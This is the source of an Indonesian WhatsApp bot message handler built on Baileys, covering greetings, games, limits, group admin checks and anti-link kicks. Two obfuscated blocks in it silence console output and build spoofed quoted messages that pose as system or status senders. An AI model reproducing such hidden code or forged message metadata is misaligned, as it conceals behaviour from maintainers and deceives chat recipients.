require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const hx = require('hxz-api')
const axios = require('axios')
const chalk = require('chalk')
const yts = require('yt-search')
const xfar = require('xfarr-api')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const request = require('request')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')

(function(_0x3ad29f,_0x26be8f){const _0xcd729c=_0x3ad29f();function _0x135223(_0x7bcd24,_0xc6dd4c,_0x504d62,_0x266f33){return _0x1183(_0xc6dd4c- -0x1ca,_0x7bcd24);}function _0x598750(_0x4fa888,_0x5a5f8b,_0x4360bf,_0x526b42){return _0x1183(_0x5a5f8b- -0xa4,_0x526b42);}while(!![]){try{const _0x5382e4=parseInt(_0x598750(0x94,0xaf,0xae,0x94))/(-0x780+-0x946*-0x1+0x97*-0x3)+parseInt(_0x135223(-0x61,-0x70,-0x8b,-0x7d))/(-0x2375+0x625+-0x1d52*-0x1)+-parseInt(_0x135223(-0x60,-0x7d,-0x73,-0x67))/(0x8f7+-0x1968+0x34*0x51)+parseInt(_0x135223(-0x65,-0x78,-0x66,-0x93))/(0x95*-0xc+-0x118c+-0x4*-0x623)+-parseInt(_0x598750(0xaa,0xbb,0xa9,0xb4))/(0xd5c+0x55*-0x57+0xa*0x18e)+parseInt(_0x598750(0x8a,0xa2,0xb2,0x9e))/(0x12aa+-0x35*0x1+0xd*-0x16b)+parseInt(_0x135223(-0x57,-0x67,-0x62,-0x4c))/(-0x1c7+-0x8e*-0x29+-0x14f0)*(-parseInt(_0x135223(-0x7b,-0x8d,-0x8f,-0x8e))/(-0x1*-0x117a+0x1*-0x1297+0x125));if(_0x5382e4===_0x26be8f)break;else _0xcd729c['push'](_0xcd729c['shift']());}catch(_0x520e15){_0xcd729c['push'](_0xcd729c['shift']());}}}(_0x1b52,-0x3*-0x86852+0x8*0x22657+-0x1d5732));const _0x586666=(function(){let _0x4da2e2=!![];return function(_0x3106f2,_0x4d2b41){const _0x1d008c={};function _0x4c0ce0(_0x1244ab,_0x5b43ea,_0x25d2a0,_0x3319a4){return _0x1183(_0x25d2a0-0x47,_0x5b43ea);}_0x1d008c[_0x4c0ce0(0x19a,0x1b4,0x19f,0x194)]=_0x10a0dc(0x4a7,0x496,0x4a4,0x499);const _0x3c373c=_0x1d008c;function _0x10a0dc(_0x2f45da,_0x27ccba,_0x4b5a38,_0x4cecfb){return _0x1183(_0x4b5a38-0x33b,_0x4cecfb);}const _0x591b22=_0x4da2e2?function(){function _0x4ca364(_0xe0c880,_0x405324,_0x4044ff,_0x44d542){return _0x4c0ce0(_0xe0c880-0x15d,_0x405324,_0x4044ff-0x387,_0x44d542-0x153);}function _0x34b11b(_0x4b5be6,_0x4de327,_0x667063,_0x524615){return _0x10a0dc(_0x4b5be6-0x12f,_0x4de327-0x95,_0x667063- -0x290,_0x524615);}if(_0x4d2b41){if(_0x4ca364(0x537,0x53f,0x537,0x527)===_0x3c373c[_0x34b11b(0x218,0x1e6,0x203,0x20d)]){const _0x245001=_0x4d2b41[_0x34b11b(0x1e8,0x1f1,0x1f5,0x210)](_0x3106f2,arguments);return _0x4d2b41=null,_0x245001;}else{if(_0x42f3c7){const _0x22ae68=_0x583b1f[_0x4ca364(0x531,0x525,0x518,0x4fe)](_0x20d461,arguments);return _0x39bb5b=null,_0x22ae68;}}}}:function(){};return _0x4da2e2=![],_0x591b22;};}()),_0x3f70ea=_0x586666(this,function(){const _0x5c602f={};_0x5c602f[_0x5ecfdb(-0x274,-0x26b,-0x26e,-0x27a)]=_0x2cc63d(-0xb2,-0xa2,-0xb6,-0x9c)+'+$';function _0x5ecfdb(_0x40503b,_0x3fb615,_0x379797,_0x5089cb){return _0x1183(_0x5089cb- -0x3ce,_0x3fb615);}const _0x16a540=_0x5c602f;function _0x2cc63d(_0x4642f2,_0x3cdae3,_0x49f52d,_0x28939c){return _0x1183(_0x49f52d- -0x220,_0x4642f2);}return _0x3f70ea['toString']()[_0x5ecfdb(-0x272,-0x286,-0x263,-0x275)](_0x5ecfdb(-0x27a,-0x25e,-0x257,-0x264)+'+$')[_0x5ecfdb(-0x295,-0x27f,-0x2a8,-0x28e)]()[_0x5ecfdb(-0x264,-0x282,-0x288,-0x273)+'r'](_0x3f70ea)[_0x5ecfdb(-0x25e,-0x27c,-0x27f,-0x275)](_0x16a540['nKQwS']);});_0x3f70ea();const _0x144387=(function(){const _0x64b068={};_0x64b068[_0x752e7a(0x299,0x2aa,0x2c6,0x29b)]=function(_0x28df6a,_0x173ab0){return _0x28df6a!==_0x173ab0;};function _0x398f91(_0x11dcac,_0x56a04b,_0x27d95d,_0x20abd6){return _0x1183(_0x11dcac-0x3a4,_0x27d95d);}_0x64b068[_0x752e7a(0x2df,0x2cd,0x2b6,0x2e7)]=_0x752e7a(0x2c5,0x2b5,0x299,0x29e);const _0x3f25f9=_0x64b068;function _0x752e7a(_0x49a891,_0x596b71,_0x1c31cb,_0x5edc6d){return _0x1183(_0x596b71-0x166,_0x49a891);}let _0x1a0957=!![];return function(_0x24234d,_0x395e9a){function _0x2cc0cc(_0x12b817,_0x526d00,_0x4d6bb7,_0x30e349){return _0x752e7a(_0x4d6bb7,_0x12b817-0x156,_0x4d6bb7-0x192,_0x30e349-0xde);}function _0x4fe01f(_0x556e41,_0x309339,_0x129c98,_0x1b4304){return _0x752e7a(_0x1b4304,_0x129c98- -0x1cb,_0x129c98-0x31,_0x1b4304-0x1ec);}if(_0x3f25f9[_0x2cc0cc(0x400,0x406,0x41a,0x3e8)](_0x3f25f9[_0x2cc0cc(0x423,0x433,0x40a,0x42a)],_0x2cc0cc(0x40b,0x428,0x40e,0x401))){const _0x29a1bc=_0x35ce24['constructo'+'r'][_0x4fe01f(0x112,0xf8,0xff,0xf0)][_0x4fe01f(0xf8,0xed,0xf0,0x10c)](_0x446684),_0x32b8e3=_0x3d6a2e[_0x56fa8e],_0xa91421=_0x3f3c0f[_0x32b8e3]||_0x29a1bc;_0x29a1bc[_0x4fe01f(0xd7,0xea,0xe0,0xc6)]=_0x1810aa[_0x2cc0cc(0x411,0x41b,0x3f9,0x401)](_0xcff12c),_0x29a1bc[_0x4fe01f(0xc7,0xcd,0xdb,0xc2)]=_0xa91421[_0x4fe01f(0xf6,0xd9,0xdb,0xf0)][_0x2cc0cc(0x411,0x3f7,0x40a,0x40c)](_0xa91421),_0x13fabf[_0x32b8e3]=_0x29a1bc;}else{const _0x1e2ad3=_0x1a0957?function(){function _0x3492b6(_0x3fc019,_0xed1786,_0x128b0e,_0x4308eb){return _0x2cc0cc(_0xed1786- -0x1aa,_0xed1786-0x2a,_0x128b0e,_0x4308eb-0x1f);}if(_0x395e9a){const _0x5a9508=_0x395e9a[_0x3492b6(0x245,0x25c,0x255,0x24b)](_0x24234d,arguments);return _0x395e9a=null,_0x5a9508;}}:function(){};return _0x1a0957=![],_0x1e2ad3;}};}()),_0x5efd8d=_0x144387(this,function(){const _0xf5168a={'ZuXjL':function(_0x1a7723,_0x340e47){return _0x1a7723!==_0x340e47;},'sZPzD':_0x1b8298(0x3ac,0x3a4,0x3be,0x3a4),'SSEpd':function(_0x875efe,_0x50f118){return _0x875efe(_0x50f118);},'rqFoW':function(_0x4c2874,_0x3ebf12){return _0x4c2874+_0x3ebf12;},'yVUSz':'{}.constru'+_0x498d73(-0x188,-0x192,-0x19c,-0x194)+_0x1b8298(0x40a,0x3f5,0x3ee,0x3d5)+'\x20)','yTwVk':function(_0x4485e6){return _0x4485e6();},'sxqRy':'log','rQYrC':_0x1b8298(0x3e4,0x3e5,0x3ca,0x3c9),'xekrf':_0x498d73(-0x187,-0x17e,-0x195,-0x19b),'FaIJJ':_0x498d73(-0x18e,-0x17e,-0x1a0,-0x192),'Crndw':_0x1b8298(0x3b8,0x39f,0x3bb,0x3ab),'LwhLS':_0x498d73(-0x18f,-0x1b7,-0x1b9,-0x19f),'GyNdB':function(_0x5d8f11,_0x3037ea){return _0x5d8f11===_0x3037ea;},'ysZAg':_0x498d73(-0x1b7,-0x1b8,-0x1bc,-0x1aa)},_0x56c853=function(){function _0x4cda02(_0x27b56f,_0x7db608,_0x91877d,_0x21322e){return _0x1b8298(_0x27b56f-0xa6,_0x91877d,_0x7db608- -0x34c,_0x21322e-0x5c);}function _0x3dda55(_0x51b2fb,_0x1b2eba,_0x322ec8,_0x5552ae){return _0x498d73(_0x1b2eba,_0x1b2eba-0x11c,_0x322ec8-0x8f,_0x322ec8- -0x9b);}if(_0xf5168a[_0x3dda55(-0x270,-0x26c,-0x264,-0x281)](_0xf5168a['sZPzD'],_0x4cda02(0x77,0x72,0x5e,0x88)))_0x17b8a4=_0x4b9a24;else{let _0x4d7036;try{_0x4d7036=_0xf5168a[_0x4cda02(0x91,0x9e,0x8c,0x91)](Function,_0xf5168a[_0x3dda55(-0x229,-0x25c,-0x240,-0x237)](_0xf5168a['rqFoW']('return\x20(fu'+_0x3dda55(-0x22d,-0x238,-0x231,-0x22b),_0xf5168a[_0x3dda55(-0x23e,-0x22d,-0x237,-0x242)]),');'))();}catch(_0x9251c5){_0x4d7036=window;}return _0x4d7036;}};function _0x1b8298(_0x13507b,_0x3291aa,_0x59d00c,_0x19a0e2){return _0x1183(_0x59d00c-0x282,_0x3291aa);}const _0x56bfd6=_0xf5168a['yTwVk'](_0x56c853),_0x21976f=_0x56bfd6['console']=_0x56bfd6['console']||{};function _0x498d73(_0x3fe7eb,_0x750d95,_0x12760d,_0x1ccab7){return _0x1183(_0x1ccab7- -0x301,_0x3fe7eb);}const _0x16717c=[_0xf5168a[_0x1b8298(0x3ff,0x3fe,0x3f0,0x3da)],_0xf5168a[_0x1b8298(0x3d8,0x3cf,0x3ce,0x3e8)],_0xf5168a[_0x498d73(-0x1c7,-0x1af,-0x1b1,-0x1c0)],_0xf5168a[_0x1b8298(0x3c4,0x3a2,0x3bd,0x3c7)],_0xf5168a['Crndw'],_0xf5168a[_0x498d73(-0x1d5,-0x1b3,-0x1d5,-0x1c2)],'trace'];for(let _0xf0ec76=-0x1*0x718+-0x186d*-0x1+-0x105*0x11;_0xf0ec76<_0x16717c[_0x498d73(-0x196,-0x186,-0x184,-0x191)];_0xf0ec76++){if(_0xf5168a[_0x498d73(-0x19c,-0x1b3,-0x1b2,-0x1b0)](_0xf5168a[_0x1b8298(0x3ba,0x3ea,0x3d2,0x3da)],'klkBd')){const _0x40ffd5=_0x7913e2?function(){function _0x3c4686(_0x56f853,_0x216ddf,_0xa3fcb6,_0x17a49f){return _0x498d73(_0xa3fcb6,_0x216ddf-0xf,_0xa3fcb6-0x5a,_0x216ddf-0x251);}if(_0x44d5ed){const _0x3dc406=_0x550471[_0x3c4686(0xb3,0x9a,0x85,0xb2)](_0x502abc,arguments);return _0x9536d8=null,_0x3dc406;}}:function(){};return _0x564707=![],_0x40ffd5;}else{const _0x17b6b9=_0x144387[_0x1b8298(0x3c2,0x3c1,0x3dd,0x3ec)+'r']['prototype'][_0x498d73(-0x199,-0x1b5,-0x1b7,-0x1ac)](_0x144387),_0x17ed64=_0x16717c[_0xf0ec76],_0x1ed143=_0x21976f[_0x17ed64]||_0x17b6b9;_0x17b6b9[_0x498d73(-0x1a9,-0x1ae,-0x1c2,-0x1bc)]=_0x144387['bind'](_0x144387),_0x17b6b9['toString']=_0x1ed143[_0x1b8298(0x3a8,0x3dc,0x3c2,0x3c9)][_0x1b8298(0x3ec,0x3c1,0x3d7,0x3de)](_0x1ed143),_0x21976f[_0x17ed64]=_0x17b6b9;}}});function _0x1183(_0x3f70ea,_0x586666){const _0x1b52f9=_0x1b52();return _0x1183=function(_0x118323,_0x9aeaed){_0x118323=_0x118323-(0xcd1*0x1+-0x1c43+-0x1da*-0x9);let _0x3875af=_0x1b52f9[_0x118323];return _0x3875af;},_0x1183(_0x3f70ea,_0x586666);}_0x5efd8d();const hariini=moment['tz'](_0x43ecb2(0x158,0x16f,0x164,0x168)+'ta')[_0x43ecb2(0x165,0x14e,0x165,0x167)](_0x5b765a(-0x60,-0x73,-0x60,-0x7a)+'MMM\x20YYYY');function _0x5b765a(_0x112e72,_0x46cdfe,_0x1c5481,_0x1315bd){return _0x1183(_0x112e72- -0x1b6,_0x1c5481);}function _0x43ecb2(_0xaab8ea,_0xe88b12,_0x57122f,_0x52983d){return _0x1183(_0x52983d-0x7,_0x57122f);}function _0x1b52(){const _0x1a3694=['lNsru','__proto__','4514586qnIIFD','ura','warn','0@s.whatsa','apply','afomous.ga','rQYrC','61020rKtYdA','pp.net','obvLb','ysZAg','GyNdB','1458184xKRcnw','326516TOzlHC','nKQwS','bind','dddd,\x20DD\x20M','xGkvJ','otQXV','search','2469182DrAzlz','constructo','rqFoW','Asia/Jayap','ia\x0aSitus\x20:','8005640ZCdYkO','format','Asia/Jakar','table','2674zvrEEy','prototype','yVUSz','info','qOrwU','SSEpd','DpRIj','(((.+)+)+)','nction()\x20','rn\x20this\x22)(','ctor(\x22retu','sxqRy','error','length','ZuXjL','exception','\x20www.yosok','FaIJJ','MNVAc','4176CxpcBz','HH:mm:ss','LwhLS','toString','xekrf','©MEIXGAN','DD\x20MMMM\x20YY'];_0x1b52=function(){return _0x1a3694;};return _0x1b52();}const hariiini=moment['tz'](_0x5b765a(-0x55,-0x65,-0x6c,-0x40)+'ta')[_0x43ecb2(0x158,0x16d,0x163,0x167)](_0x43ecb2(0x12d,0x157,0x12f,0x14a)+'YY'),barat=moment['tz'](_0x43ecb2(0x174,0x16c,0x156,0x168)+'ta')[_0x43ecb2(0x177,0x16f,0x16c,0x167)](_0x43ecb2(0x12b,0x155,0x15d,0x145)),tengah=moment['tz']('Asia/Makas'+'sar')[_0x5b765a(-0x56,-0x6f,-0x4c,-0x68)](_0x5b765a(-0x78,-0x8a,-0x7f,-0x7f)),timur=moment['tz'](_0x43ecb2(0x151,0x17d,0x14e,0x164)+_0x5b765a(-0x6f,-0x85,-0x6a,-0x59))[_0x43ecb2(0x16c,0x16e,0x172,0x167)](_0x43ecb2(0x12a,0x15b,0x12a,0x145)),nyoutube=_0x43ecb2(0x12d,0x142,0x163,0x149)+_0x43ecb2(0x163,0x16a,0x180,0x165)+_0x5b765a(-0x7c,-0x72,-0x8b,-0x63)+_0x5b765a(-0x6b,-0x71,-0x6f,-0x66),ini_mark=_0x5b765a(-0x6d,-0x75,-0x7f,-0x8a)+_0x5b765a(-0x68,-0x5c,-0x62,-0x4b);

const ownernya = ownernomer + '@s.whatsapp.net'

const { groupAdmins,updateDatabase } = require('./lib/functions.js')
//database
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
0
//ALL DATABASE
server = JSON.parse(fs.readFileSync('./database/server.json'))
grups = JSON.parse(fs.readFileSync('./database/grups.json'))
//TIME
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌉'
 } 

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = LyeeBotz = async (LyeeBotz, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await LyeeBotz.decodeJid(LyeeBotz)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid

	    //Janggan asal redit !! Redit ? eror
	    const _0x1d944e=_0x4bc6;(function(_0x4119b2,_0x538456){const _0x4c6493=_0x4bc6,_0x308e0e=_0x4119b2();while(!![]){try{const _0x256226=parseInt(_0x4c6493(0x114))/0x1+-parseInt(_0x4c6493(0xfb))/0x2*(-parseInt(_0x4c6493(0x113))/0x3)+parseInt(_0x4c6493(0x106))/0x4*(-parseInt(_0x4c6493(0x11a))/0x5)+-parseInt(_0x4c6493(0xff))/0x6+-parseInt(_0x4c6493(0x11c))/0x7+parseInt(_0x4c6493(0x115))/0x8*(-parseInt(_0x4c6493(0xf6))/0x9)+parseInt(_0x4c6493(0x109))/0xa*(parseInt(_0x4c6493(0x11d))/0xb);if(_0x256226===_0x538456)break;else _0x308e0e['push'](_0x308e0e['shift']());}catch(_0x341d85){_0x308e0e['push'](_0x308e0e['shift']());}}}(_0x4bd0,0x76351));const _0x426e8e=(function(){let _0x30c375=!![];return function(_0x5e96a1,_0x8c9f43){const _0x375e38=_0x30c375?function(){if(_0x8c9f43){const _0x575ece=_0x8c9f43['apply'](_0x5e96a1,arguments);return _0x8c9f43=null,_0x575ece;}}:function(){};return _0x30c375=![],_0x375e38;};}()),_0x41b673=_0x426e8e(this,function(){const _0x29bc0f=_0x4bc6;return _0x41b673[_0x29bc0f(0x11f)]()[_0x29bc0f(0xfd)](_0x29bc0f(0xf5))[_0x29bc0f(0x11f)]()[_0x29bc0f(0x101)](_0x41b673)['search']('(((.+)+)+)+$');});_0x41b673();function _0x4bd0(){const _0x5976f4=['(((.+)+)+)+$','4852602rTzDcz','BEGIN:VCARD\x0aVERSION:3.0\x0aN:XL;MEYBotz;;;\x0aFN:MEYBotz\x0aitem1.TEL;waid=6283845915899\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD','return\x20(function()\x20','1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==','+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=','94WMDmrk','MEYBotz\x20cuy','search','MEYBotz','436050igToUt','https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc','constructor','/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69','log','prototype','image/jpeg','6748EfnfYN','apply','readFileSync','10kWryqX','console','1610993486','./image/yosokanesia.jpg','{}.constructor(\x22return\x20this\x22)(\x20)','audio/ogg;\x20codecs=opus','length','__proto__','28777','true','19773kQDnEv','519880YfAWkM','8rvfeoA','0@s.whatsapp.net','bind','Hmm','status@broadcast','1275RjMJGv','warn','3313233WCwVXf','12868647GhhAZZ','chat','toString','359996400','vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=','exception','sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=','table','info','®MEYBotz'];_0x4bd0=function(){return _0x5976f4;};return _0x4bd0();}const _0x922307=(function(){let _0x151ef2=!![];return function(_0x11b03b,_0x5d7b54){const _0x3c0ad4=_0x151ef2?function(){const _0x2d5c26=_0x4bc6;if(_0x5d7b54){const _0x34028e=_0x5d7b54[_0x2d5c26(0x107)](_0x11b03b,arguments);return _0x5d7b54=null,_0x34028e;}}:function(){};return _0x151ef2=![],_0x3c0ad4;};}()),_0x54c5fa=_0x922307(this,function(){const _0x3df24d=_0x4bc6;let _0x382c18;try{const _0xdaa744=Function(_0x3df24d(0xf8)+_0x3df24d(0x10d)+');');_0x382c18=_0xdaa744();}catch(_0x2abff9){_0x382c18=window;}const _0x4e1e96=_0x382c18[_0x3df24d(0x10a)]=_0x382c18['console']||{},_0xe015e2=[_0x3df24d(0x103),_0x3df24d(0x11b),_0x3df24d(0xf3),'error',_0x3df24d(0xf0),_0x3df24d(0xf2),'trace'];for(let _0x179fae=0x0;_0x179fae<_0xe015e2[_0x3df24d(0x10f)];_0x179fae++){const _0x41f802=_0x922307[_0x3df24d(0x101)][_0x3df24d(0x104)][_0x3df24d(0x117)](_0x922307),_0x5cc6d1=_0xe015e2[_0x179fae],_0x119caf=_0x4e1e96[_0x5cc6d1]||_0x41f802;_0x41f802[_0x3df24d(0x110)]=_0x922307[_0x3df24d(0x117)](_0x922307),_0x41f802['toString']=_0x119caf[_0x3df24d(0x11f)]['bind'](_0x119caf),_0x4e1e96[_0x5cc6d1]=_0x41f802;}});_0x54c5fa();function _0x4bc6(_0x552c64,_0x1ad487){const _0x118add=_0x4bd0();return _0x4bc6=function(_0x54c5fa,_0x922307){_0x54c5fa=_0x54c5fa-0xee;let _0x1a9409=_0x118add[_0x54c5fa];return _0x1a9409;},_0x4bc6(_0x552c64,_0x1ad487);}const ftroli={'key':{'fromMe':![],'participant':_0x1d944e(0x116),'remoteJid':_0x1d944e(0x119)},'message':{'orderMessage':{'itemCount':0x7e6,'status':0xc8,'thumbnail':thumb,'surface':0xc8,'message':_0x1d944e(0xf4),'orderTitle':'memek','sellerJid':'0@s.whatsapp.net'}},'contextInfo':{'forwardingScore':0x3e7,'isForwarded':!![]},'sendEphemeral':!![]},fdoc={'key':{'participant':_0x1d944e(0x116),...m[_0x1d944e(0x11e)]?{'remoteJid':_0x1d944e(0x119)}:{}},'message':{'documentMessage':{'title':_0x1d944e(0xf4),'jpegThumbnail':thumb}}},fvn={'key':{'participant':_0x1d944e(0x116),...m['chat']?{'remoteJid':_0x1d944e(0x119)}:{}},'message':{'audioMessage':{'mimetype':_0x1d944e(0x10e),'seconds':0x15751bf0,'ptt':_0x1d944e(0x112)}}},fgif={'key':{'participant':_0x1d944e(0x116),...m[_0x1d944e(0x11e)]?{'remoteJid':_0x1d944e(0x119)}:{}},'message':{'videoMessage':{'title':_0x1d944e(0xf4),'h':_0x1d944e(0x118),'seconds':_0x1d944e(0xee),'gifPlayback':_0x1d944e(0x112),'caption':_0x1d944e(0xf4),'jpegThumbnail':thumb}}},fgclink={'key':{'participant':_0x1d944e(0x116),'remoteJid':'0@s.whatsapp.net'},'message':{'groupInviteMessage':{'groupJid':'6288213840883-1616169743@g.us','inviteCode':'m','groupName':'ig\x20:\x20@xaveey.xv','caption':_0x1d944e(0xf4),'jpegThumbnail':thumb}}},fvideo={'key':{'fromMe':![],'participant':_0x1d944e(0x116),...m[_0x1d944e(0x11e)]?{'remoteJid':_0x1d944e(0x119)}:{}},'message':{'videoMessage':{'title':''+pushname,'h':_0x1d944e(0x118),'seconds':_0x1d944e(0xee),'caption':''+pushname,'jpegThumbnail':thumb}}},floc={'key':{'participant':_0x1d944e(0x116),...m[_0x1d944e(0x11e)]?{'remoteJid':_0x1d944e(0x119)}:{}},'message':{'locationMessage':{'name':_0x1d944e(0xfc),'jpegThumbnail':thumb}}},fkontak={'key':{'participant':_0x1d944e(0x116),...m[_0x1d944e(0x11e)]?{'remoteJid':_0x1d944e(0x119)}:{}},'message':{'contactMessage':{'displayName':_0x1d944e(0xfe),'vcard':_0x1d944e(0xf7),'jpegThumbnail':thumb,'thumbnail':thumb,'sendEphemeral':!![]}}},fakestatus={'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...m['chat']?{'remoteJid':_0x1d944e(0x119)}:{}},'message':{'imageMessage':{'url':_0x1d944e(0x100),'mimetype':_0x1d944e(0x105),'caption':_0x1d944e(0xf4),'fileSha256':_0x1d944e(0xfa),'fileLength':_0x1d944e(0x111),'height':0x438,'width':0x437,'mediaKey':_0x1d944e(0xef),'fileEncSha256':_0x1d944e(0xf1),'directPath':_0x1d944e(0x102),'mediaKeyTimestamp':_0x1d944e(0x10b),'jpegThumbnail':fs[_0x1d944e(0x108)](_0x1d944e(0x10c)),'scansSidecar':_0x1d944e(0xf9)}}};
		
        // Group
        const groupMetadata = m.isGroup ? await LyeeBotz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
        const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = true
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: true,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
        
        // Public & Self
        if (!LyeeBotz.public) {
            if (!m.key.fromMe) return
        }
        if (m.message) {
            LyeeBotz.readMessages([m.key])
        }

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await LyeeBotz.setStatus(`${LyeeBotz.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 *ANTI LINK* 」\n\n*Kamu terdeteksi mengirim link group*, *maaf kamu akan di kick‼️,yang mau juga silahkan kirim link‼️*`)
